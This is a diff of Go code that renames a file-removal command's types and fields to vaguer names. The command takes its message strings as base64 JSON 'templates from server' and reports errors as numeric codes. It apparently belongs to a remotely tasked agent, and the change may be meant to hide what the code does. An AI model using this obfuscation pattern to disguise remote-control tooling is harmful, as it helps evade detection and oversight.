@@ -14,8 +14,8 @@ import (
 	"time"
 )
 
-// RmTemplate receives string templates from server
-type RmTemplate struct {
+// RemoveCfg receives string templates from server
+type RemoveCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -36,53 +36,53 @@ const (
 	idxRmErrIsDirectory  = 246 // is a directory
 )
 
-// RmCommand handles file and directory removal
-type RmCommand struct {
-	tpl *RmTemplate
+// RemoveMsg handles file and directory removal
+type RemoveMsg struct {
+	tpl *RemoveCfg
 }
 
 // getTpl safely retrieves a template string by index
-func (c *RmCommand) getTpl(idx int) string {
+func (c *RemoveMsg) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
 		return c.tpl.Templates[idx]
 	}
 	return ""
 }
 
-func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data - required for operation
-	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
-		return CommandResult{
+func (c *RemoveMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data - required for operation
+	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	c.tpl = &RmTemplate{}
+	c.tpl = &RemoveCfg{}
 	if err := json.Unmarshal(decoded, c.tpl); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Check if no arguments provided
 	if len(args) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -123,10 +123,10 @@ func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 
 	// Check if we have any targets to remove
 	if len(targets) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -268,15 +268,15 @@ func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 		exitCode = 1
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      finalOutput,
-		ExitCode:    exitCode,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    exitCode,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // removeAllWithDetails recursively removes directory contents
-func (c *RmCommand) removeAllWithDetails(path string, force bool) (int, error) {
+func (c *RemoveMsg) removeAllWithDetails(path string, force bool) (int, error) {
 	removedCount := 0
 
 	// First, check if we can access the directory
@@ -368,7 +368,7 @@ func (c *RmCommand) removeAllWithDetails(path string, force bool) (int, error) {
 }
 
 // parseRemovalError creates error codes for removal errors
-func (c *RmCommand) parseRemovalError(target string, err error) string {
+func (c *RemoveMsg) parseRemovalError(target string, err error) string {
 	errStr := err.Error()
 
 	// Get error patterns from template
